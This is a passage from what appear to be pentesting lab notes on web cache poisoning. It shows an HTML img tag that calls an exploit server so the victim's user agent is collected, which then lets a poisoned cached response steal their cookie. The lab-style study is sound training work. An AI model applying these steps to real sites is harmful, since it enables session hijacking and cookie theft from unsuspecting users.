And due to the “vary” header in the response, we needed the user agent too for it to successfully fire.

So we just added a simple
```
<img src="[https://exploit-0a4d00330455c077c008b8ba018f00d3.exploit-server.net/foo](https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo)" /> 
```

on a blog page on the side, the user retrieved it and we get their user agent in access log we can use to finish the initial cache poisoning attack to retrieve their cookie. Simply add their user agent in the cached server response and it will work on them in this case.

![unnamed_806df6370707487290047b2433e1cf3d](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/Web%20Cache%20Poisoning/Unknown%20Header%20and%20user%20agent%20restriction/{{notename}}-202605011506.png)
![unnamed_f69b4628eefa4d3885497603dd3148c4](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/Web%20Cache%20Poisoning/Unknown%20Header%20and%20user%20agent%20restriction/{{notename}}-202605011506-1.png)
